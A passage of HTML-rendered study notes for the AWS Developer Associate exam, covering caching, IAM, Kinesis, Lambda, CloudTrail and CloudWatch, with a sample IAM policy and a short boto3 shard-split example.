<h3 id="write-through"><a class="header" href="#write-through">Write-through</a></h3>
  <img src="clouds/aws/dva-c02/images/caching-3.png" width="77%" height="40%" />
  <img src="clouds/aws/dva-c02/images/caching-4.png" width="77%" height="40%" />
<h2 id="cache-evictions-and-ttl"><a class="header" href="#cache-evictions-and-ttl">Cache Evictions and TTL</a></h2>
<ul>
<li>Cache eviction can occur in 3 ways:
<ul>
<li>You delete the item in the cache</li>
<li>Item is evicted because the memory is full and its not in use (LRU)</li>
<li>The TTL (time to live) has expired
<ul>
<li>TTL can range from a few seconds to days</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="iam"><a class="header" href="#iam">IAM</a></h1>
<h4 id="table-of-contents-2"><a class="header" href="#table-of-contents-2">Table of Contents</a></h4>
<ul>
<li><a href="#Introduction-1">Introduction</a></li>
<li><a href="#Users-and-Groups">Users and Groups</a></li>
<li><a href="#IAM-Policies">IAM Policies</a></li>
<li><a href="#Password-Policy">Password Policies</a></li>
<li><a href="#MFA">MFA</a></li>
<li><a href="#IAM-Roles">IAM Roles</a></li>
<li><a href="#IAM-Security-Tools">IAM Security Tools</a></li>
</ul>
<hr>
<p><a id="Introduction-1"></a></p>
<h2 id="introduction-10"><a class="header" href="#introduction-10">Introduction</a></h2>
<ul>
<li>IAM is Identity and Access Management</li>
<li>IAM is a global service</li>
<li>Do not use the root account, create user accounts instead</li>
</ul>
<p><a id="Users-and-Groups"></a></p>
<h2 id="users-and-groups"><a class="header" href="#users-and-groups">Users and Groups</a></h2>
<ul>
<li>Groups can only contain users, not other groups</li>
<li>Users do not need to belong to a group. Users can belong to multiple groups</li>
</ul>
<p><a id="IAM-Policies"></a></p>
<h2 id="iam-policies"><a class="header" href="#iam-policies">IAM Policies</a></h2>
<ul>
<li>
<p>Users and groups can be assigned a policy called an IAM policy. IAM policies are JSON documents:</p>
<pre><code>    {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "EnableDisableHongKong",
                "Effect": "Allow",
                "Action": [
                    "account:EnableRegion",
                    "account:DisableRegion"
                ],
                "Resource": "*",
                "Condition": {
                    "StringEquals": {"account:TargetRegion": "ap-east-1"}
                }
            },
            {
                "Sid": "ViewConsole",
                "Effect": "Allow",
                "Action": [
                    "account:ListRegions"
                ],
                "Resource": "*"
            }
        ]
    }
</code></pre>
</li>
<li>
<p>IAM policy inheritance</p>
<ul>
<li>inline policies are attached directly to users</li>
<li>If an IAM policy is attached to a group, any users in that group will inherit settings from the policy</li>
</ul>
<img src="clouds/aws/dva-c02/images/iam-policy-explanation.png" width="77%" height="40%" />
</li>
</ul>
<p><a id="Password-Policy"></a></p>
<h2 id="password-policy"><a class="header" href="#password-policy">Password Policy</a></h2>
  <img src="clouds/aws/dva-c02/images/iam-pass-policy.png" width="77%" height="40%" />
<p><a id="MFA"></a></p>
<h2 id="mfa-multi-factor-authentication"><a class="header" href="#mfa-multi-factor-authentication">MFA (Multi-factor authentication)</a></h2>
<ul>
<li>Virtual MFA device
<ul>
<li>Google Authenticator</li>
<li>Authy</li>
</ul>
</li>
<li>Universal 2nd Factor Security Key
<ul>
<li>Ubikey</li>
</ul>
</li>
<li>Hardware Key Fob
<ul>
<li>Also has a special option for GovCloud</li>
</ul>
</li>
</ul>
<p><a id="IAM-Roles"></a></p>
<h2 id="iam-roles"><a class="header" href="#iam-roles">IAM Roles</a></h2>
<ul>
<li>Allows AWS service to perform actions on your behalf. When creating the role, you choose which service the role will apply to (For example, EC2)</li>
<li>Assign permissions to AWS services with IAM roles</li>
</ul>
<p><a id="IAM-Security-Tools"></a></p>
<h2 id="iam-security-tools"><a class="header" href="#iam-security-tools">IAM Security Tools</a></h2>
<ul>
<li>IAM Credentials Report
<ul>
<li>A report that lists all user accounts and status of their credentials</li>
</ul>
</li>
<li>IAM Access Advisor
<ul>
<li>Access advisor shows the service permissions granted to a user and when those services were last accessed</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kinesis"><a class="header" href="#kinesis">Kinesis</a></h1>
<h2 id="introduction-11"><a class="header" href="#introduction-11">Introduction</a></h2>
<ul>
<li>Kinesis is a set of services provided by AWS
<ul>
<li>Kinesis Data Streams: capture, process, and store data streams</li>
<li>Kinesis Data Firehose: load data streams into AWS data stores</li>
<li>Kinesis Data Analytics: analyze data streams with SQL or Apache Flink</li>
<li>Kinesis Video Streams: Capture, process and store video streams</li>
</ul>
</li>
</ul>
<h2 id="kinesis-data-firehose"><a class="header" href="#kinesis-data-firehose">Kinesis Data Firehose</a></h2>
<ul>
<li>Records up to 1 MB can be sent to Kinesis Data Firehose and Firehose will then batch writees to other resources in <b>near real-time</b></li>
<li>Fully managed by AWS, autoscales</li>
<li>Pay only for the data going through Firehose</li>
<li>Producers such as (Applications, Kinesis Agent, Kinesis Data Streams, CloudWatch, AWS IoT) can write to Firehose, and Firehose will then send the data to S3, RedShift, or OpenSearch</li>
<li>Data Firehose can also send to 3rd parties such as Splunk, Datadog, etc.</li>
<li>You can transform data using Lambda functions before sending it to the destination</li>
</ul>
<h1 id="kinesis-streams"><a class="header" href="#kinesis-streams">Kinesis Streams</a></h1>
<p>Collect and process large streams of data in real-time.</p>
<h2 id="use-cases"><a class="header" href="#use-cases">Use Cases:</a></h2>
<ul>
<li>Fast (second/millisecond latency) processing of log events</li>
<li>Real-time metrics and reporting</li>
<li>Data analytics</li>
<li>Complex stream processing</li>
</ul>
<h2 id="kinesis-libraries--tools"><a class="header" href="#kinesis-libraries--tools">Kinesis Libraries / Tools:</a></h2>
<h3 id="producing-data"><a class="header" href="#producing-data">Producing Data:</a></h3>
<ul>
<li>
<p><strong>Kinesis Producer Library (KPL)</strong></p>
<ul>
<li>Blog post: Implementing Efficient and Reliable Producers with the Amazon Kinesis Producer Library</li>
<li>Auto-retry configurable mechanism</li>
<li>Supports two complementary ways of batching:
<ul>
<li><strong>Collection (of stream records):</strong>
<ul>
<li>Buffers/collects records to write multiple records to multiple shards in a single request.</li>
<li><code>RecordMaxBufferedTime</code>: max time a record may be buffered before a request is sent. Larger = more throughput but higher latency.</li>
</ul>
</li>
<li><strong>Aggregation (of user records):</strong>
<ul>
<li>Combines multiple user records into a single Kinesis stream record (using PutRecords API request).</li>
<li>KCL integration (for deaggregating user records).</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Kinesis Agent</strong></p>
<ul>
<li>Standalone application that you can install on the servers you‚Äôre interested in.</li>
<li>Features:
<ul>
<li>Monitors file patterns and sends new data records to delivery streams</li>
<li>Handles file rotation, checkpointing, and retry upon failure</li>
<li>Delivers all data in a reliable, timely, and simpler manner</li>
<li>Emits CloudWatch metrics for monitoring and troubleshooting</li>
<li>Allows preprocessing data, e.g., converting multi-line record to single line, converting from delimiter to JSON, converting from log to JSON.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="kinesis-streams-api"><a class="header" href="#kinesis-streams-api">Kinesis Streams API:</a></h3>
<h4 id="reading-data"><a class="header" href="#reading-data">Reading Data:</a></h4>
<ul>
<li><strong>Kinesis Client Library (KCL)</strong>
<ul>
<li>The KCL ensures there is a record processor running and processing each shard.</li>
<li>Uses a DynamoDB table to store control data. It creates one table per application that is processing data.</li>
<li>Creates a worker thread for each shard. Auto-assigns shards to workers (even workers on different EC2 instances).</li>
<li><strong>KCL Checkpointing</strong>
<ul>
<li>Last processed record sequence number is stored in DynamoDB.</li>
<li>On worker failure, KCL restarts from last checkpointed record.</li>
<li>Supports deaggregation of records aggregated with KPL.</li>
<li>Note: KCL may be bottlenecked by DynamoDB table (throwing Provisioned Throughput Exceptions). Add more provisioned throughput to the DynamoDB table if needed.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="emitting-data"><a class="header" href="#emitting-data">Emitting Data:</a></h4>
<ul>
<li><strong>Kinesis Connector Library (Java) for KCL</strong>
<ul>
<li>Connectors for: DynamoDB, Redshift, S3, Elasticsearch.</li>
<li>Java library with the following steps/interfaces:
<ul>
<li><code>iTransformer</code>: maps from stream records to user-defined data model.</li>
<li><code>iFilter</code>: removes irrelevant records.</li>
<li><code>iBuffer</code>: buffers based on size limit and total byte count.</li>
<li><code>iEmitter</code>: sends the data in the buffer to AWS services.</li>
<li><code>S3Emitter</code>: writes buffer to a single file.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="kinesis-stream-api"><a class="header" href="#kinesis-stream-api">Kinesis Stream API:</a></h3>
<ul>
<li><strong>PutRecord</strong> (single record per HTTP request)</li>
<li><strong>PutRecords</strong> (multiple records per single HTTP request). Recommended for higher throughput.
<ul>
<li>Single record failure does not stop the processing of subsequent records.</li>
<li>Will return HTTP 200 as long as some records succeed (even when others failed).</li>
<li>Retry requires application code in the producer to examine the <code>PutRecordsResult</code> object and retry whichever records failed.</li>
</ul>
</li>
</ul>
<h2 id="key-concepts"><a class="header" href="#key-concepts">Key Concepts</a></h2>
<h3 id="kinesis-data-streams"><a class="header" href="#kinesis-data-streams">Kinesis Data Streams:</a></h3>
<ul>
<li>
<p>Stream big data into AWS</p>
</li>
<li>
<p><a href="https://docs.aws.amazon.com/streams/latest/dev/key-concepts.html#partition-key">Kinesis Data Streams</a></p>
</li>
<li>
<p>A stream is a set of shards. Each shard is a sequence of data records.</p>
<ul>
<li>Shards are numbered (shard1, shard2, etc.)</li>
</ul>
</li>
<li>
<p>Each data record has a sequence number that is assigned automatically by the stream.</p>
</li>
<li>
<p>A data record has 3 parts:</p>
<ul>
<li>Sequence number</li>
<li>Partition key</li>
<li>Data blob (immutable sequence of bytes, up to 1000KB).</li>
</ul>
</li>
<li>
<p>Sequence number is only unique within its shard.</p>
</li>
<li>
<p><strong>Retention Period:</strong></p>
<ul>
<li>Retention for messages within a Data Stream can be set to 1 - 365 days</li>
<li>You pay more for longer retention periods.</li>
</ul>
</li>
<li>
<p>Consumers and Producers</p>
<ul>
<li>producers send data (records) into data streams
<ul>
<li>records consist of a partition key and a data blob</li>
<li>producers can send 1MB/sec or 1000 msg/sec per shard</li>
</ul>
</li>
<li>Consumers receive data from data streams
<ul>
<li>consumers can be apps, lambda functions, Kinesis Data Firehose, or Kinesis Data Analytics</li>
<li>Consumers can receive messages at 2 MB/sec (shared version, across all consumers) per shard or 2 MB/sec (enhanced version) per consumer per shard
<img src="clouds/aws/dva-c02/images/kinesis-consumers.png" width="77%" height="40%" /></li>
</ul>
</li>
</ul>
</li>
<li>
<p>Once data is inserted into Kinesis, it cannot be deleted</p>
</li>
<li>
<p>Capacity Modes:</p>
<ul>
<li>Provisioned Mode
<ul>
<li>Choose the number of shards provisioner</li>
<li>Scale manually</li>
<li>Each shard gets 1 MB/s in and 2 MB/s out</li>
<li>Pay per shard provisioned per hour</li>
</ul>
</li>
<li>On-demand Mode:
<ul>
<li>No need to provision or manage capacity</li>
<li>Auto-scaling</li>
<li>Pay per stream per hour and data in/out per GB</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Access control to Data Streams using IAM policies</p>
</li>
<li>
<p>Encryption in flight with HTTPS and at rest with KMS</p>
</li>
<li>
<p>Kinesis Data Streams support VPC Endpoints</p>
</li>
<li>
<p>Monitor API calls using CloudTrail</p>
</li>
</ul>
<h3 id="kinesis-application-name"><a class="header" href="#kinesis-application-name">Kinesis Application Name:</a></h3>
<ul>
<li>Each application must have a unique name per (AWS account, region). The name is used to identify the DynamoDB and the namespace for CloudWatch metrics.</li>
</ul>
<h3 id="partition-keys"><a class="header" href="#partition-keys">Partition Keys:</a></h3>
<ul>
<li>Used to group data by shard within a stream. It must be present when writing to the stream.</li>
<li>When writing to a stream, Kinesis separates data records into multiple shards based on each record‚Äôs partition key.</li>
<li>Partition keys are Unicode strings with a maximum length of 256 bytes. An MD5 hash function is used to map partition keys to 128-bit integer values that define which shard records will end up in.</li>
</ul>
<h3 id="kinesis-shard"><a class="header" href="#kinesis-shard">Kinesis Shard:</a></h3>
<ul>
<li>Uniquely identified group of data records in a stream.</li>
<li>Multiple shards in a stream are possible.</li>
<li><strong>Single shard capacity:</strong>
<ul>
<li>Write: 1 MB/sec input, 1000 writes/sec.</li>
<li>Read: 2 MB/sec output, 5 transaction reads/sec.</li>
</ul>
</li>
<li><strong>Resharding:</strong>
<ul>
<li><strong>Shard split:</strong> divide a shard into two shards.
<ul>
<li>Example using boto3:
<pre><code class="language-python">sinfo = kinesis.describe_stream("BotoDemo")
hkey = int(sinfo["StreamDescription"]["Shards"][0]["HashKeyRange"]["EndingHashKey"])
shard_id = 'shardId-000000000000'  # we only have one shard!
kinesis.split_shard("BotoDemo", shard_id, str((hkey+0)/2))
</code></pre>
</li>
</ul>
</li>
<li><strong>Shard merge:</strong> merge two shards into one.</li>
</ul>
</li>
</ul>
<h3 id="kinesis-server-side-encryption"><a class="header" href="#kinesis-server-side-encryption">Kinesis Server-Side Encryption:</a></h3>
<ul>
<li>Can automatically encrypt data written, using KMS master keys. Both producer and consumer must have permission to access the master key.</li>
<li>Add <code>kms:GenerateDataKey</code> to producer‚Äôs role.</li>
<li>Add <code>kms:Decrypt</code> to consumer‚Äôs role.</li>
</ul>
<h3 id="kinesis-firehose"><a class="header" href="#kinesis-firehose">Kinesis Firehose:</a></h3>
<ul>
<li>Managed service for loading data from streams directly into S3, Redshift, and Elasticsearch.</li>
<li>Fully managed: scalability, sharding, and monitoring with zero admin.</li>
<li>Secure.</li>
<li><strong>Methods to Load Data:</strong>
<ul>
<li>Use Kinesis Agent.</li>
<li>Use AWS SDK.</li>
<li><strong>PutRecord and PutRecordBatch.</strong></li>
<li><strong>Firehose to S3:</strong>
<ul>
<li>Buffering of data before sending to S3. Sends whenever any of these conditions is met:
<ul>
<li>Buffer size (from 1 MB to 128 MB).</li>
<li>Buffer interval (from 60s to 900s).</li>
</ul>
</li>
<li>Can invoke AWS Lambda for data transformation.
<ul>
<li>Data flow:
<ol>
<li>Buffers incoming data up to 3 MB or buffering size specified, whichever is lowest.</li>
<li>Firehose invokes Lambda function.</li>
<li>Transformed data is sent from Lambda to Firehose for buffering.</li>
<li>Transformed data is delivered to the destination.</li>
</ol>
</li>
<li><strong>Response from Lambda must include:</strong>
<ul>
<li><code>recordId</code>: must be the same as prior to transformation.</li>
<li><code>result</code>: status, one of: ‚ÄúOk‚Äù, ‚ÄúDropped‚Äù, ‚ÄúProcessingFailed‚Äù.</li>
<li><code>data</code>: Transformed data payload.</li>
</ul>
</li>
<li><strong>Failure handling of data transformation:</strong>
<ul>
<li>3 retries.</li>
<li>Invocation errors logged in CloudWatch Logs.</li>
<li>Unsuccessful records are stored in <code>processing_failed</code> folder in S3.</li>
<li>It‚Äôs possible to store the source records in S3, prior to transformation (Backup S3 bucket).</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><strong>Data Delivery Speed:</strong>
<ul>
<li><strong>S3:</strong> based on buffer size/buffer interval.</li>
<li><strong>Redshift:</strong> depending on how fast the Redshift cluster finishes the COPY command.</li>
<li><strong>Elasticsearch:</strong> depends on buffer size (1-100 MB) and buffer interval.</li>
</ul>
</li>
<li><strong>Firehose Failure Handling:</strong>
<ul>
<li><strong>S3:</strong> retries for up to 24 hrs.</li>
<li><strong>Redshift:</strong> retry duration from 0-7200 sec (2 hrs) from S3.
<ul>
<li>Skips S3 objects on failure.</li>
<li>Writes failed objects in manifest file, which can be used manually to recover lost data (manual backfill).</li>
</ul>
</li>
<li><strong>ElasticSearch:</strong> retry duration 0-7200 sec.
<ul>
<li>On failure, skips index request and stores in <code>index_failed</code> folder in S3.</li>
<li>Manual backfill.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="aws-kinesis-overview"><a class="header" href="#aws-kinesis-overview">AWS Kinesis Overview:</a></h2>
<ul>
<li>Enables real-time processing of streaming data at massive scale.</li>
<li><strong>Kinesis Streams:</strong>
<ul>
<li>Enables building custom applications that process or analyze streaming data for specialized needs.</li>
<li>Handles provisioning, deployment, ongoing-maintenance of hardware, software, or other services for the data streams.</li>
<li>Manages the infrastructure, storage, networking, and configuration needed to stream the data at the required data throughput level.</li>
<li>Synchronously replicates data across three facilities in an AWS Region, providing high availability and data durability.</li>
<li>Stores records of a stream for up to 24 hours, by default, from the time they are added to the stream. The limit can be raised to up to 7 days by enabling extended data retention.</li>
<li>Data such as clickstreams, application logs, social media, etc., can be added from multiple sources and within seconds is available for processing to the Amazon Kinesis Applications.</li>
<li>Provides ordering of records, as well as the ability to read and/or replay records in the same order to multiple Kinesis applications.</li>
<li>Useful for rapidly moving data off data producers and then continuously processing the data, whether it is to transform the data before emitting to a data store, run real-time metrics and analytics, or derive more complex data streams for further processing.</li>
</ul>
</li>
</ul>
<h3 id="use-cases-1"><a class="header" href="#use-cases-1">Use Cases:</a></h3>
<ul>
<li><strong>Accelerated log and data feed intake:</strong> Data producers can push data to Kinesis stream as soon as it is produced, preventing any data loss and making it available for processing within seconds.</li>
<li><strong>Real-time metrics and reporting:</strong> Metrics can be extracted and used to generate reports from data in real-time.</li>
<li><strong>Real-time data analytics:</strong> Run real-time streaming data analytics.</li>
<li><strong>Complex stream processing:</strong> Create Directed Acyclic Graphs (DAGs) of Kinesis Applications and data streams, with Kinesis applications adding to another Amazon Kinesis stream for further processing, enabling successive stages of stream processing.</li>
</ul>
<h3 id="kinesis-limits"><a class="header" href="#kinesis-limits">Kinesis Limits:</a></h3>
<ul>
<li>Stores records of a stream for up to 24 hours, by default, which can be extended to max 7 days.</li>
<li>Maximum size of a data blob (the data payload before Base64-encoding) within one record is 1 megabyte (MB).</li>
<li>Each shard can support up to 1000 PUT records per second.</li>
<li>Each account can provision 10 shards per region, which can be increased further through request.</li>
<li>Amazon Kinesis is designed to process streaming big data and the pricing model allows heavy PUTs rate.</li>
<li>Amazon S3 is a cost-effective way to store your data but not designed to handle a stream of data in real-time.</li>
</ul>
<h2 id="kinesis-streams-components"><a class="header" href="#kinesis-streams-components">Kinesis Streams Components:</a></h2>
<h3 id="shard"><a class="header" href="#shard">Shard:</a></h3>
<ul>
<li>Streams are made of shards and is the base throughput unit of a Kinesis stream.</li>
<li>Each shard provides a capacity of 1MB/sec data input and 2MB/sec data output.</li>
<li>Each shard can support up to 1000 PUT records per second.</li>
<li>All data is stored for 24 hours.</li>
<li>Replay data inside a 24-hour window.</li>
<li><strong>Capacity Limits:</strong> If the limits are exceeded, either by data throughput or the number of PUT records, the put data call will be rejected with a <code>ProvisionedThroughputExceeded</code> exception.
<ul>
<li>This can be handled by:
<ul>
<li>Implementing a retry on the data producer side, if this is due to a temporary rise of the stream‚Äôs input data rate.</li>
<li>Dynamically scaling the number of shared (resharding) to provide enough capacity for the put data calls to consistently succeed.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="record"><a class="header" href="#record">Record:</a></h3>
<ul>
<li>A record is the unit of data stored in an Amazon Kinesis stream.</li>
<li>A record is composed of a sequence number, partition key, and data blob.
<ul>
<li>Data blob is the data of interest your data producer adds to a stream.</li>
<li>Maximum size of a data blob (the data payload before Base64-encoding) is 1 MB.</li>
</ul>
</li>
</ul>
<h3 id="partition-key"><a class="header" href="#partition-key">Partition Key:</a></h3>
<ul>
<li>Used to segregate and route records to different shards of a stream.</li>
<li>Specified by your data producer while adding data to an Amazon Kinesis stream.</li>
</ul>
<h3 id="sequence-number"><a class="header" href="#sequence-number">Sequence Number:</a></h3>
<ul>
<li>A unique identifier for each record.</li>
<li>Assigned by Amazon Kinesis when a data producer calls <code>PutRecord</code> or <code>PutRecords</code> operation to add data to an Amazon Kinesis stream.</li>
<li>Sequence numbers for the same partition key generally increase over time; the longer the time period between <code>PutRecord</code> or <code>PutRecords</code> requests, the larger the sequence numbers become.</li>
</ul>
<h3 id="data-producers"><a class="header" href="#data-producers">Data Producers:</a></h3>
<ul>
<li>Data can be added to an Amazon Kinesis stream via <code>PutRecord</code> and <code>PutRecords</code> operations, Kinesis Producer Library (KPL), or Kinesis Agent.</li>
</ul>
<h3 id="amazon-kinesis-agent"><a class="header" href="#amazon-kinesis-agent">Amazon Kinesis Agent:</a></h3>
<ul>
<li>A pre-built Java application that offers an easy way to collect and send data to Amazon Kinesis stream.</li>
<li>Can be installed on Linux-based server environments such as web servers, log servers, and database servers.</li>
<li>Configured to monitor certain files on the disk and then continuously send new data to the Amazon Kinesis stream.</li>
</ul>
<h3 id="amazon-kinesis-producer-library-kpl"><a class="header" href="#amazon-kinesis-producer-library-kpl">Amazon Kinesis Producer Library (KPL):</a></h3>
<ul>
<li>An easy to use and highly configurable library that helps you put data into an Amazon Kinesis stream.</li>
<li>Presents a simple, asynchronous, and reliable interface that enables you to quickly achieve high producer throughput with minimal client resources.</li>
</ul>
<h3 id="amazon-kinesis-application"><a class="header" href="#amazon-kinesis-application">Amazon Kinesis Application:</a></h3>
<ul>
<li>A data consumer that reads and processes data from an Amazon Kinesis stream.</li>
<li>Can be built using either Amazon Kinesis API or Amazon Kinesis Client Library (KCL).</li>
</ul>
<h3 id="amazon-kinesis-client-library-kcl"><a class="header" href="#amazon-kinesis-client-library-kcl">Amazon Kinesis Client Library (KCL):</a></h3>
<ul>
<li>A pre-built library with multiple language support.</li>
<li>Delivers all records for a given partition key to the same record processor.</li>
<li>Makes it easier to build multiple applications reading from the same Kinesis stream (e.g., to perform counting, aggregation, and filtering).</li>
<li>Handles complex issues such as adapting to changes in stream volume, load-balancing streaming data, coordinating distributed services, and processing data with fault-tolerance.</li>
</ul>
<h3 id="amazon-kinesis-connector-library"><a class="header" href="#amazon-kinesis-connector-library">Amazon Kinesis Connector Library:</a></h3>
<ul>
<li>A pre-built library that helps you easily integrate Amazon Kinesis Streams with other AWS services and third-party tools.</li>
<li>Kinesis Client Library is required for Kinesis Connector Library.</li>
</ul>
<h3 id="amazon-kinesis-storm-spout"><a class="header" href="#amazon-kinesis-storm-spout">Amazon Kinesis Storm Spout:</a></h3>
<ul>
<li>A pre-built library that helps you easily integrate Amazon Kinesis Streams with Apache Storm.</li>
</ul>
<h2 id="kinesis-vs-sqs"><a class="header" href="#kinesis-vs-sqs">Kinesis vs SQS:</a></h2>
<ul>
<li><strong>Kinesis Streams</strong> enables real-time processing of streaming big data while <strong>SQS</strong> offers a reliable, highly scalable hosted queue for storing messages and moving data between distributed application components.</li>
<li>Kinesis provides ordering of records, as well as the ability to read and/or replay records in the same order to multiple Amazon Kinesis Applications, while SQS does not guarantee data ordering and provides at least once delivery of messages.</li>
<li>Kinesis stores the data up to 24 hours, by default, and can be extended to 7 days, while SQS stores the message up to 4 days, by default, and can be configured from 1 minute to 14 days but clears the message once deleted by the consumer.</li>
<li>Kinesis and SQS both guarantee at-least-once delivery of messages.</li>
<li>Kinesis supports multiple consumers, while SQS allows the messages to be delivered to only one consumer at a time and requires multiple queues to deliver messages to multiple consumers.</li>
</ul>
<h2 id="kinesis-use-case-requirements"><a class="header" href="#kinesis-use-case-requirements">Kinesis Use Case Requirements:</a></h2>
<ul>
<li>Ordering of records.</li>
<li>Ability to consume records in the same order a few hours later.</li>
<li>Ability for multiple applications to consume the same stream concurrently.</li>
<li>Routing related records to the same record processor (as in streaming MapReduce).</li>
</ul>
<h2 id="sqs-use-case-requirements"><a class="header" href="#sqs-use-case-requirements">SQS Use Case Requirements:</a></h2>
<ul>
<li>Messaging semantics like message-level ack/fail and visibility timeout.</li>
<li>Leveraging SQS‚Äôs ability to scale transparently.</li>
<li>Dynamically increasing concurrency/throughput at read time.</li>
<li>Individual message delay, which can be delayed.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lambda"><a class="header" href="#lambda">Lambda</a></h1>
<h2 id="introduction-12"><a class="header" href="#introduction-12">Introduction</a></h2>
<ul>
<li>Serverless, virtual functions</li>
<li>Short executions up to 15 minutes</li>
<li>Run on-demand</li>
<li>Pay for number of invocations and compute time</li>
<li>Works with many programming languages
<ul>
<li>Node.js, python, Java, c#, Go, Powershell, Ruby, and Custom Runtime API (which can run practically any language)</li>
</ul>
</li>
<li></li>
<li>You can provision up to 10GB of RAM per function</li>
<li></li>
</ul>
<h2 id="lambda-integrations"><a class="header" href="#lambda-integrations">Lambda Integrations</a></h2>
<ul>
<li>API Gateway</li>
<li>Kinesis</li>
<li>DynamoDB</li>
<li>S3</li>
<li>CloudFront</li>
<li>CloudWatch Events / EventBridge</li>
<li>CloudWatch Logs</li>
<li>SNS</li>
<li>SQS</li>
<li>Cognito</li>
</ul>
<h2 id="pricing-2"><a class="header" href="#pricing-2">Pricing</a></h2>
<ul>
<li>Pay per call:
<ul>
<li>First 1,000,000 requests are free</li>
<li>.20 per 1 million requests after the first million</li>
</ul>
</li>
<li>Pay per duration
<ul>
<li>400,000 GB-seconds of compute time per month for free</li>
</ul>
</li>
</ul>
<h2 id="synchronous-invocation"><a class="header" href="#synchronous-invocation">Synchronous Invocation</a></h2>
<ul>
<li>When invoking the function from the CLI, SDK, API Gateway, or ALB, the call is synchronous, meaning the result is returned right away</li>
<li>Error handling must happen on the client side (retires, exponential backoff, etc.)</li>
</ul>
<h2 id="asynchronous-invocation"><a class="header" href="#asynchronous-invocation">Asynchronous Invocation</a></h2>
<ul>
<li>S3, SNS, CloudWatch Events are all processed asynchronously</li>
<li>The events are placed in an internal event queue</li>
<li>The lambda function will read from the event queue and attempt to process the events</li>
<li>Lambda will attempt to retry failures up to 3 times
<ul>
<li>This means that event <b>may</b> be processed multiple times, so make sure the lambda function is idempotent</li>
<li>If the function is retried, you will see duplicate entries in CloudWatch Logs</li>
<li>You can define a DLQ (dead-letter queue) (SNS or SQS) for failed processing</li>
</ul>
</li>
<li>Async invocations allow you to speed up the processing if you don‚Äôt need to wait for the result</li>
</ul>
<h2 id="s3-event-notifications"><a class="header" href="#s3-event-notifications">S3 Event Notifications</a></h2>
<ul>
<li>Run a Lambda function when a event in S3 is detected</li>
</ul>
<h2 id="lambda-event-source-mapping"><a class="header" href="#lambda-event-source-mapping">Lambda Event Source Mapping</a></h2>
<ul>
<li>Lambda will poll from the sources and be invoked synchronously
<ul>
<li>Kinesis Data Streams</li>
<li>SQS or SQS FIFO</li>
<li>DynamoDB Streams</li>
</ul>
</li>
<li>Two categories of Event Source Mapping:
<ul>
<li>Streams
<ul>
<li>Kinesis or DynamoDB Streams</li>
<li>One Lambda invokation per stream shard</li>
<li>If you use parallelization, up to 10 batches processed per shard simultaneously</li>
</ul>
</li>
<li>Queues
<ul>
<li>Poll SQS using Long Polling</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="lambda-in-vpc"><a class="header" href="#lambda-in-vpc">Lambda in VPC</a></h2>
<ul>
<li>By default, Lambda functions are launched outside of your VPC. Therefore, it cannot access resources in your VPC.</li>
<li>Lambda can create an Elastic Network Interface inside your VPC
<ul>
<li>You must define the VPC ID, subnets, and security groups</li>
<li>Lambda requires the AWSLambdaVPCAccessExecutionRole</li>
</ul>
</li>
<li>By default, a Lambda function in your VPC does not have internet access
<ul>
<li>Deploying a Lambda function in a public subnet <b>does not</b> give it internet access</li>
<li>Instead, you can deploy the Lambda function in a private subnet and give it internet access via a NAT Gateway / NAT Instance</li>
</ul>
</li>
</ul>
<h2 id="lambda-concurrency"><a class="header" href="#lambda-concurrency">Lambda Concurrency</a></h2>
<ul>
<li>Concurrency limit up to 1000 concurrent executions</li>
<li>each invocation over the concurrency limit will respond with a HTTP 429</li>
<li>Cold starts and provisioned concurrency
<ul>
<li>If the init is large, cold start could take a long time. This may cause the first request to have high latency than the rest</li>
<li>To resolve the cold start issue, you can use <code>Provisioned concurrency</code>
<ul>
<li>With Provisioned Concurrency, concurrency is allocated before the function is invoked</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="lambda-containers"><a class="header" href="#lambda-containers">Lambda Containers</a></h2>
<ul>
<li>Deploy Lambda functions as container images up to 10GB from ECR</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cloudtrail"><a class="header" href="#cloudtrail">CloudTrail</a></h1>
<h2 id="introduction-13"><a class="header" href="#introduction-13">Introduction</a></h2>
<ul>
<li>Internal monitors of API calls being made</li>
<li>Audit changes to AWS resources</li>
<li>Enabled by default</li>
<li>Event Types:
<ul>
<li>Management Events</li>
<li>Data Events</li>
<li>CloudTrail Insights Events
<ul>
<li>analyze events and try to detect unusual activity in your account</li>
</ul>
</li>
</ul>
</li>
<li>Event Retention
<ul>
<li>Events are stored by default for 90 days</li>
<li>To keep events beyond this period, log them to S3 and use Athena to analyze them</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cloudwatch"><a class="header" href="#cloudwatch">CloudWatch</a></h1>
<h2 id="introduction-14"><a class="header" href="#introduction-14">Introduction</a></h2>
<ul>
<li>Metrics, Logs, Events, and Alarms</li>
</ul>
<h2 id="cloudwatch-metrics"><a class="header" href="#cloudwatch-metrics">CloudWatch Metrics</a></h2>
<ul>
<li>CloudWatch provides metrics for every service in AWS</li>
<li>Metric is a variable to monitor (CPU Utilization, Network In, etc.)</li>
<li>Metrics belong to namespaces</li>
<li>Dimension is an attribute of a metric (instance id, environment, etc.)</li>
<li>Up to 30 dimensions per metric</li>
<li>Metrics have timestamp</li>
<li>You can create dashboards of metrics</li>
</ul>
<h3 id="ec2-detailed-monitoring"><a class="header" href="#ec2-detailed-monitoring">EC2 Detailed Monitoring</a></h3>
<ul>
<li>By default, EC2 instance have metrics every 5 minutes</li>
<li>If you enable detailed monitoring, you can get metrics every 1 minute``</li>
<li>Use detailed monitoring if you want your ASG to scale faster</li>
<li>The AWS Free tier allows us to have 10 detailed monitoring metrics</li>
<li>EC2 memory usage is not pushed by default (you must push it from inside the instance as a custom metric)</li>
</ul>
